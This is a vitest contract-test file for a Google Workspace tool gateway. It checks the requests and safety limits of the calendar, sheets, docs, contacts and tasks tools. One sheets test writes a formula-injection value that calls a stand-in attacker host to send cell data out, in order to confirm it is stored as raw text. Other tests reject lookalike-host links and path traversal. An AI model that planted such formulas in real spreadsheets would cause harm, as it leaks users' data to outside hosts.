// Contract tests: every tool against answers shaped as Google's API reference documents them, and the requests
// each tool sends (method, address, query and body).
import { describe, expect, it } from 'vitest';
import type { GatewayJsonObject } from '../src/gateway.js';
import { ALL_SCOPES, SCOPES } from '../src/google/client.js';
import { fileIdFrom } from '../src/google/values.js';
import {
  APP,
  CAL,
  DOCS,
  EVENT,
  EVENTS,
  PEOPLE,
  REFRESH,
  SHEETS,
  TASKS,
  TOKEN_URL,
  USERINFO,
  apiCalls,
  gateway,
  tokenAnswer,
  type Stub,
} from './helpers.js';

const SHEET_ID = '1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms';
const DOC_ID = '195j9eDD3ccgjQRttHhJPymLJUCOUjs-jmwTrekvdjFE';

function writable(routes: Record<string, Stub>) {
  return gateway(routes, { policy: { enableWrites: true } });
}

async function call(routes: Record<string, Stub>, tool: string, input: GatewayJsonObject) {
  const { gw, fetchImpl } = writable(routes);
  const result = await gw.callTool(tool, input);
  return { result, calls: apiCalls(fetchImpl), data: result.structuredContent as Record<string, unknown> };
}

function query(url: string): Record<string, string> {
  return Object.fromEntries(new URL(url).searchParams);
}

describe('check_connection', () => {
  it('names the account and the parts of Google Workspace the consent covers', async () => {
    const granted = ['openid', 'https://www.googleapis.com/auth/userinfo.email', SCOPES.calendarList, SCOPES.calendarEvents, SCOPES.sheets].join(' ');
    const { gw } = gateway({
      [`POST ${TOKEN_URL}`]: { body: tokenAnswer({ scope: granted }) },
      [`GET ${USERINFO}/userinfo`]: {
        body: { sub: '110169484474386276334', email: 'anna@example.dk', email_verified: true, hd: 'example.dk' },
      },
    });
    const result = await gw.callTool('check_connection', {});
    expect(result.isError, result.content[0]?.text).toBeUndefined();
    expect(result.structuredContent).toEqual({
      account: { id: '110169484474386276334', email: 'anna@example.dk', hostedDomain: 'example.dk' },
      services: { calendar: true, sheets: true, docs: false, contacts: false, tasks: false },
    });
  });
});

describe('calendar', () => {
  it('lists calendars', async () => {
    const { data, calls } = await call(
      {
        [`GET ${CAL}/users/me/calendarList`]: {
          body: {
            kind: 'calendar#calendarList',
            items: [
              { kind: 'calendar#calendarListEntry', id: 'anna@example.dk', summary: 'anna@example.dk', primary: true, accessRole: 'owner', timeZone: 'Europe/Copenhagen' },
              { kind: 'calendar#calendarListEntry', id: 'c_team@group.calendar.google.com', summary: 'Team', summaryOverride: 'Holdet', accessRole: 'writer' },
            ],
          },
        },
      },
      'list_calendars',
      {},
    );
    expect(data.calendars).toEqual([
      { id: 'anna@example.dk', summary: 'anna@example.dk', primary: true, accessRole: 'owner', timeZone: 'Europe/Copenhagen' },
      { id: 'c_team@group.calendar.google.com', summary: 'Holdet', primary: false, accessRole: 'writer' },
    ]);
    expect(query(calls[0]!.url)).toEqual({ maxResults: '250' });
  });

  it('lists events in order of start, as single occurrences, and keeps only the fields a person reads', async () => {
    const { data, calls } = await call(
      { [`GET ${CAL}/calendars/c_team%40group.calendar.google.com/events`]: { body: { kind: 'calendar#events', timeZone: 'Europe/Copenhagen', items: [EVENT], nextPageToken: 'CigKGjVv' } } },
      'list_events',
      { calendarId: 'c_team@group.calendar.google.com', timeMin: '2026-11-24T00:00:00+01:00', query: 'møde', maxResults: 10 },
    );
    expect(query(calls[0]!.url)).toEqual({
      timeMin: '2026-11-24T00:00:00+01:00',
      q: 'møde',
      maxResults: '10',
      singleEvents: 'true',
      orderBy: 'startTime',
    });
    expect(data).toEqual({
      timeZone: 'Europe/Copenhagen',
      nextPageToken: 'CigKGjVv',
      events: [
        {
          id: 'abc123def456',
          status: 'confirmed',
          summary: 'Byggemøde',
          location: 'Testvej 1, 8000 Aarhus C',
          start: { dateTime: '2026-11-24T09:00:00+01:00', timeZone: 'Europe/Copenhagen' },
          end: { dateTime: '2026-11-24T10:00:00+01:00', timeZone: 'Europe/Copenhagen' },
          organizer: 'anna@example.dk',
          attendees: [{ email: 'bo@example.dk', responseStatus: 'needsAction' }],
          htmlLink: EVENT.htmlLink,
          updated: EVENT.updated,
        },
      ],
    });
  });

  it('refuses a time without an offset for timeMin', async () => {
    const { result, calls } = await call({}, 'list_events', { timeMin: '2026-11-24T00:00' });
    expect(result.isError).toBe(true);
    expect(calls).toEqual([]);
  });

  it('creates an event without sending mail, with a time zone or as a whole day', async () => {
    const routes = { [`POST ${EVENTS}`]: { body: EVENT } };
    const timed = await call(routes, 'create_event', {
      summary: 'Byggemøde',
      start: '2026-11-24T09:00',
      end: '2026-11-24T10:00',
      timeZone: 'Europe/Copenhagen',
      attendees: ['bo@example.dk'],
    });
    expect(timed.result.isError, timed.result.content[0]?.text).toBeUndefined();
    expect(timed.calls[0]!.method).toBe('POST');
    expect(query(timed.calls[0]!.url)).toEqual({ sendUpdates: 'none' });
    expect(timed.calls[0]!.body).toEqual({
      summary: 'Byggemøde',
      start: { dateTime: '2026-11-24T09:00', timeZone: 'Europe/Copenhagen' },
      end: { dateTime: '2026-11-24T10:00', timeZone: 'Europe/Copenhagen' },
      attendees: [{ email: 'bo@example.dk' }],
    });

    const allDay = await call(routes, 'create_event', { summary: 'Ferie', start: '2026-12-21', end: '2026-12-24' });
    expect(allDay.calls[0]!.body).toEqual({ summary: 'Ferie', start: { date: '2026-12-21' }, end: { date: '2026-12-24' } });

    for (const input of [
      { summary: 'x', start: '2026-11-24T09:00', end: '2026-11-24T10:00' },
      { summary: 'x', start: '2026-11-24', end: '2026-11-24T10:00:00+01:00' },
    ]) {
      const refused = await call(routes, 'create_event', input);
      expect(refused.result.isError, JSON.stringify(input)).toBe(true);
      expect(refused.calls).toEqual([]);
    }
  });

  it('changes an event with PATCH and answers with the values before', async () => {
    const { data, calls } = await call(
      {
        [`GET ${EVENTS}/abc123def456`]: { body: EVENT },
        [`PATCH ${EVENTS}/abc123def456`]: { body: { ...EVENT, summary: 'Byggemøde (flyttet)', location: 'Kontoret' } },
      },
      'update_event',
      { eventId: 'abc123def456', summary: 'Byggemøde (flyttet)', location: 'Kontoret' },
    );
    expect(calls.map(c => c.method)).toEqual(['GET', 'PATCH']);
    expect(query(calls[1]!.url)).toEqual({ sendUpdates: 'none' });
    expect(calls[1]!.body).toEqual({ summary: 'Byggemøde (flyttet)', location: 'Kontoret' });
    expect(data.before).toEqual({ summary: 'Byggemøde', location: 'Testvej 1, 8000 Aarhus C' });
    expect((data.event as Record<string, unknown>).summary).toBe('Byggemøde (flyttet)');
  });

  it('refuses a change with no fields, without sending anything', async () => {
    const { result, calls } = await call({}, 'update_event', { eventId: 'abc123def456' });
    expect(result.isError).toBe(true);
    expect(calls).toEqual([]);
  });
});

describe('sheets', () => {
  const RANGE = `${SHEETS}/spreadsheets/${SHEET_ID}/values/Ark1!A1%3AC3`;

  it('reads a spreadsheet by its link', async () => {
    const { data, calls } = await call(
      {
        [`GET ${SHEETS}/spreadsheets/${SHEET_ID}`]: {
          body: {
            spreadsheetId: SHEET_ID,
            properties: { title: 'Budget 2027', locale: 'da_DK', timeZone: 'Europe/Copenhagen' },
            sheets: [{ properties: { sheetId: 0, title: 'Ark1', index: 0, sheetType: 'GRID', gridProperties: { rowCount: 1000, columnCount: 26 } } }],
            spreadsheetUrl: `https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit`,
          },
        },
      },
      'get_spreadsheet',
      { spreadsheet: `https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit#gid=0` },
    );
    expect(query(calls[0]!.url).fields).toContain('sheets(properties(sheetId,title,index');
    expect(data).toEqual({
      spreadsheetId: SHEET_ID,
      title: 'Budget 2027',
      locale: 'da_DK',
      timeZone: 'Europe/Copenhagen',
      url: `https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit`,
      sheets: [{ sheetId: 0, title: 'Ark1', index: 0, rowCount: 1000, columnCount: 26 }],
    });
  });

  it('reads a range as shown, and cuts it at maxRows', async () => {
    const { data, calls } = await call(
      { [`GET ${RANGE}`]: { body: { range: 'Ark1!A1:C3', majorDimension: 'ROWS', values: [['Post', 'Beløb'], ['Husleje', '12.400,00 kr.'], ['El', '1.250,00 kr.']] } } },
      'read_range',
      { spreadsheet: SHEET_ID, range: 'Ark1!A1:C3', maxRows: 2 },
    );
    expect(query(calls[0]!.url)).toEqual({ majorDimension: 'ROWS', valueRenderOption: 'FORMATTED_VALUE' });
    expect(data).toEqual({ range: 'Ark1!A1:C3', values: [['Post', 'Beløb'], ['Husleje', '12.400,00 kr.']], rowCount: 3, truncated: true });
  });

  it('writes a range as RAW, so text is never run as a formula, and answers with the values before', async () => {
    const { data, calls } = await call(
      {
        [`GET ${RANGE}`]: { body: { range: 'Ark1!A1:C3', majorDimension: 'ROWS', values: [['gammel']] } },
        [`PUT ${RANGE}`]: { body: { spreadsheetId: SHEET_ID, updatedRange: 'Ark1!A1:B1', updatedRows: 1, updatedColumns: 2, updatedCells: 2 } },
      },
      'update_range',
      { spreadsheet: SHEET_ID, range: 'Ark1!A1:C3', values: [['=IMPORTDATA("https://evil.test/"&A2)', 12400]] },
    );
    expect(calls.map(c => c.method)).toEqual(['GET', 'PUT']);
    expect(query(calls[1]!.url)).toEqual({ valueInputOption: 'RAW' });
    expect(calls[1]!.body).toEqual({ range: 'Ark1!A1:C3', majorDimension: 'ROWS', values: [['=IMPORTDATA("https://evil.test/"&A2)', 12400]] });
    expect(data).toEqual({ updatedRange: 'Ark1!A1:B1', updatedRows: 1, updatedCells: 2, before: { range: 'Ark1!A1:C3', values: [['gammel']] } });
  });

  it('adds rows after the table, as RAW', async () => {
    const { data, calls } = await call(
      {
        [`POST ${SHEETS}/spreadsheets/${SHEET_ID}/values/Ark1!A%3AB:append`]: {
          body: { spreadsheetId: SHEET_ID, tableRange: 'Ark1!A1:B3', updates: { spreadsheetId: SHEET_ID, updatedRange: 'Ark1!A4:B4', updatedRows: 1, updatedColumns: 2, updatedCells: 2 } },
        },
      },
      'append_rows',
      { spreadsheet: SHEET_ID, range: 'Ark1!A:B', rows: [['Vand', 300]] },
    );
    expect(query(calls[0]!.url)).toEqual({ valueInputOption: 'RAW', insertDataOption: 'INSERT_ROWS' });
    expect(data).toEqual({ tableRange: 'Ark1!A1:B3', updatedRange: 'Ark1!A4:B4', updatedRows: 1, updatedCells: 2 });
  });

  it('creates a spreadsheet', async () => {
    const { data, calls } = await call(
      {
        [`POST ${SHEETS}/spreadsheets`]: {
          body: { spreadsheetId: SHEET_ID, properties: { title: 'Budget' }, sheets: [{ properties: { sheetId: 0, title: 'Indtægter' } }], spreadsheetUrl: `https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit` },
        },
      },
      'create_spreadsheet',
      { title: 'Budget', sheetTitles: ['Indtægter'] },
    );
    expect(calls[0]!.body).toEqual({ properties: { title: 'Budget' }, sheets: [{ properties: { title: 'Indtægter' } }] });
    expect(data).toEqual({ spreadsheetId: SHEET_ID, title: 'Budget', url: `https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit`, sheets: ['Indtægter'] });
  });

  it('refuses a link to another host, a range with a slash and too many cells', async () => {
    for (const input of [
      { spreadsheet: `https://evil.test/spreadsheets/d/${SHEET_ID}/edit`, range: 'A1' },
      { spreadsheet: SHEET_ID, range: 'Ark1/../x!A1' },
    ]) {
      const { result, calls } = await call({}, 'read_range', input);
      expect(result.isError, JSON.stringify(input)).toBe(true);
      expect(calls).toEqual([]);
    }
    const many = Array.from({ length: 101 }, () => Array.from({ length: 100 }, () => 1));
    const { result, calls } = await call({}, 'update_range', { spreadsheet: SHEET_ID, range: 'A1', values: many });
    expect(result.isError).toBe(true);
    expect(calls).toEqual([]);
  });
});

describe('docs', () => {
  const DOCUMENT = {
    documentId: DOC_ID,
    title: 'Referat',
    revisionId: 'ALm37BV',
    body: {
      content: [
        { endIndex: 1, sectionBreak: { sectionStyle: {} } },
        { startIndex: 1, endIndex: 9, paragraph: { elements: [{ startIndex: 1, endIndex: 9, textRun: { content: 'Referat\n', textStyle: {} } }] } },
        {
          startIndex: 9,
          endIndex: 40,
          table: {
            rows: 1,
            columns: 2,
            tableRows: [
              {
                tableCells: [
                  { content: [{ paragraph: { elements: [{ textRun: { content: 'Punkt\n' } }] } }] },
                  { content: [{ paragraph: { elements: [{ textRun: { content: 'Ansvarlig\n' } }] } }] },
                ],
              },
            ],
          },
        },
        { paragraph: { elements: [{ textRun: { content: 'Næste møde ' } }, { textRun: { content: 'tirsdag.\n' } }] } },
      ],
    },
  };

  it('reads a document as plain text, tables included', async () => {
    const { data } = await call({ [`GET ${DOCS}/documents/${DOC_ID}`]: { body: DOCUMENT } }, 'get_document', {
      document: `https://docs.google.com/document/d/${DOC_ID}/edit?tab=t.0`,
    });
    expect(data).toEqual({ documentId: DOC_ID, title: 'Referat', revisionId: 'ALm37BV', text: 'Referat\nPunkt\tAnsvarlig\nNæste møde tirsdag.\n', length: 44 });
  });

  it('adds text at the end, and nothing else', async () => {
    const { data, calls } = await call(
      { [`POST ${DOCS}/documents/${DOC_ID}:batchUpdate`]: { body: { documentId: DOC_ID, replies: [{}], writeControl: { requiredRevisionId: 'ALm37BW' } } } },
      'append_text',
      { document: DOC_ID, text: '\nBeslutning: vi bestiller.' },
    );
    expect(calls[0]!.body).toEqual({ requests: [{ insertText: { endOfSegmentLocation: { segmentId: '' }, text: '\nBeslutning: vi bestiller.' } }] });
    expect(data).toEqual({ documentId: DOC_ID, revisionId: 'ALm37BW', insertedChars: 26 });
  });

  it('creates a document with text', async () => {
    const { data, calls } = await call(
      {
        [`POST ${DOCS}/documents`]: { body: { documentId: DOC_ID, title: 'Notat', revisionId: 'r1' } },
        [`POST ${DOCS}/documents/${DOC_ID}:batchUpdate`]: { body: { documentId: DOC_ID, replies: [{}] } },
      },
      'create_document',
      { title: 'Notat', text: 'Hej' },
    );
    expect(calls.map(c => c.body)).toEqual([{ title: 'Notat' }, { requests: [{ insertText: { endOfSegmentLocation: { segmentId: '' }, text: 'Hej' } }] }]);
    expect(data).toEqual({ documentId: DOC_ID, title: 'Notat', url: `https://docs.google.com/document/d/${DOC_ID}/edit`, insertedChars: 3 });
  });
});

describe('contacts', () => {
  const PERSON = {
    resourceName: 'people/c7142250453257580122',
    etag: '%EgUBAi43PRoEAQIFByIMR0xQUEJ0R2t2ZHM9',
    names: [{ metadata: { primary: true }, displayName: 'Anna Jensen', familyName: 'Jensen', givenName: 'Anna' }],
    emailAddresses: [{ metadata: { primary: true }, value: 'anna@example.dk' }],
    phoneNumbers: [{ value: '+45 12 34 56 78', canonicalForm: '+4512345678' }],
    organizations: [{ name: 'Demo Byg ApS', title: 'Projektleder' }],
  };
  const SHAPED = {
    resourceName: 'people/c7142250453257580122',
    name: 'Anna Jensen',
    givenName: 'Anna',
    familyName: 'Jensen',
    emails: ['anna@example.dk'],
    phones: ['+45 12 34 56 78'],
    organizations: [{ name: 'Demo Byg ApS', title: 'Projektleder' }],
  };

  it('lists and searches contacts with names, e-mail, phone and company only', async () => {
    const listed = await call(
      { [`GET ${PEOPLE}/people/me/connections`]: { body: { connections: [PERSON], totalPeople: 1, totalItems: 1 } } },
      'list_contacts',
      {},
    );
    expect(query(listed.calls[0]!.url)).toEqual({
      personFields: 'names,emailAddresses,phoneNumbers,organizations',
      pageSize: '50',
      sortOrder: 'LAST_MODIFIED_DESCENDING',
    });
    expect(listed.data).toEqual({ contacts: [SHAPED], totalItems: 1 });

    const searched = await call({ [`GET ${PEOPLE}/people:searchContacts`]: { body: { results: [{ person: PERSON }] } } }, 'search_contacts', { query: 'Anna' });
    expect(query(searched.calls[0]!.url)).toEqual({ query: 'Anna', readMask: 'names,emailAddresses,phoneNumbers,organizations', pageSize: '10' });
    expect(searched.data).toEqual({ contacts: [SHAPED] });
  });

  it('creates a contact', async () => {
    const { data, calls } = await call({ [`POST ${PEOPLE}/people:createContact`]: { body: PERSON } }, 'create_contact', {
      givenName: 'Anna',
      familyName: 'Jensen',
      emails: ['anna@example.dk'],
      organization: { name: 'Demo Byg ApS' },
    });
    expect(calls[0]!.body).toEqual({
      names: [{ givenName: 'Anna', familyName: 'Jensen' }],
      emailAddresses: [{ value: 'anna@example.dk' }],
      organizations: [{ name: 'Demo Byg ApS', title: '' }],
    });
    expect(data).toEqual(SHAPED);
  });

  it('changes a contact with its etag and the field mask, and answers with the values before', async () => {
    const id = 'c7142250453257580122';
    const { data, calls } = await call(
      {
        [`GET ${PEOPLE}/people/${id}`]: { body: PERSON },
        [`PATCH ${PEOPLE}/people/${id}:updateContact`]: { body: { ...PERSON, phoneNumbers: [{ value: '+45 87 65 43 21' }] } },
      },
      'update_contact',
      { contact: `people/${id}`, phones: ['+45 87 65 43 21'] },
    );
    expect(query(calls[1]!.url)).toEqual({ updatePersonFields: 'phoneNumbers', personFields: 'names,emailAddresses,phoneNumbers,organizations' });
    expect(calls[1]!.body).toEqual({ phoneNumbers: [{ value: '+45 87 65 43 21' }], etag: PERSON.etag });
    expect(data.before).toEqual({ phones: ['+45 12 34 56 78'] });
  });
});

describe('tasks', () => {
  const TASK = {
    kind: 'tasks#task',
    id: 'dGFzazE',
    etag: '"LTE"',
    title: 'Send tilbud',
    updated: '2026-11-20T10:00:00.000Z',
    selfLink: 'https://www.googleapis.com/tasks/v1/lists/l1/tasks/dGFzazE',
    position: '00000000000000000000',
    notes: 'Til Demo Byg',
    status: 'needsAction',
    due: '2026-11-25T00:00:00.000Z',
    links: [],
    webViewLink: 'https://tasks.google.com/task/dGFzazE',
  };

  it('lists task lists and open tasks', async () => {
    const lists = await call(
      { [`GET ${TASKS}/users/@me/lists`]: { body: { kind: 'tasks#taskLists', items: [{ kind: 'tasks#taskList', id: 'MTI', title: 'Mine opgaver', updated: '2026-11-20T10:00:00.000Z' }] } } },
      'list_task_lists',
      {},
    );
    expect(lists.data).toEqual({ taskLists: [{ id: 'MTI', title: 'Mine opgaver', updated: '2026-11-20T10:00:00.000Z' }] });

    const tasks = await call({ [`GET ${TASKS}/lists/%40default/tasks`]: { body: { kind: 'tasks#tasks', items: [TASK] } } }, 'list_tasks', { dueMax: '2026-11-30' });
    expect(query(tasks.calls[0]!.url)).toEqual({ showCompleted: 'false', showHidden: 'false', dueMax: '2026-11-30T00:00:00.000Z', maxResults: '50' });
    expect((tasks.data.tasks as unknown[])[0]).toEqual({
      id: 'dGFzazE',
      title: 'Send tilbud',
      notes: 'Til Demo Byg',
      status: 'needsAction',
      due: '2026-11-25T00:00:00.000Z',
      updated: '2026-11-20T10:00:00.000Z',
      webViewLink: 'https://tasks.google.com/task/dGFzazE',
    });
  });

  it('creates a task and marks one done, with the values before', async () => {
    const created = await call({ [`POST ${TASKS}/lists/MTI/tasks`]: { body: TASK } }, 'create_task', { taskList: 'MTI', title: 'Send tilbud', due: '2026-11-25' });
    expect(created.calls[0]!.body).toEqual({ title: 'Send tilbud', due: '2026-11-25T00:00:00.000Z' });

    const done = await call(
      {
        [`GET ${TASKS}/lists/%40default/tasks/dGFzazE`]: { body: TASK },
        [`PATCH ${TASKS}/lists/%40default/tasks/dGFzazE`]: { body: { ...TASK, status: 'completed', completed: '2026-11-21T09:00:00.000Z' } },
      },
      'update_task',
      { task: 'dGFzazE', completed: true },
    );
    expect(done.calls[1]!.body).toEqual({ status: 'completed' });
    expect(done.data.before).toEqual({ status: 'needsAction' });
  });
});

describe('nothing can delete, share or send mail', () => {
  it('has no tool whose name or requests delete, share, move or send', async () => {
    const { googleToolCatalog } = await import('../src/gateway.js');
    for (const entry of googleToolCatalog) {
      expect(entry.name).not.toMatch(/delete|remove|trash|share|send|move|clear/);
      for (const op of entry.upstream) {
        expect(op.method).not.toBe('DELETE');
        expect(op.path).not.toMatch(/acl|permissions|send|move|clear|delete|batchDelete/i);
      }
    }
  });

  it('asks Google for no restricted scope: no Gmail and no Drive', () => {
    for (const scope of ALL_SCOPES) expect(scope).not.toMatch(/gmail|mail\.google|\/drive/);
  });
});

describe('links', () => {
  it('takes the id from a docs.google.com link only', () => {
    expect(fileIdFrom(`https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit#gid=0`, 'spreadsheets')).toBe(SHEET_ID);
    expect(fileIdFrom(`https://docs.google.com/spreadsheets/u/1/d/${SHEET_ID}/`, 'spreadsheets')).toBe(SHEET_ID);
    expect(fileIdFrom(SHEET_ID, 'spreadsheets')).toBe(SHEET_ID);
    expect(fileIdFrom(`https://docs.google.com/document/d/${DOC_ID}/edit`, 'spreadsheets')).toBeUndefined();
    expect(fileIdFrom(`http://docs.google.com/spreadsheets/d/${SHEET_ID}`, 'spreadsheets')).toBeUndefined();
    expect(fileIdFrom(`https://docs.google.com.evil.test/spreadsheets/d/${SHEET_ID}`, 'spreadsheets')).toBeUndefined();
  });
});

describe('the gateway with the app and the refresh token', () => {
  it('refuses a refresh token equal to the client secret', () => {
    return import('../src/gateway.js').then(({ createGoogleGateway }) => {
      expect(() => createGoogleGateway({ ...APP, refreshToken: APP.clientSecret })).toThrow(/key was refused/);
      expect(() => createGoogleGateway({ ...APP, refreshToken: REFRESH })).not.toThrow();
    });
  });
});
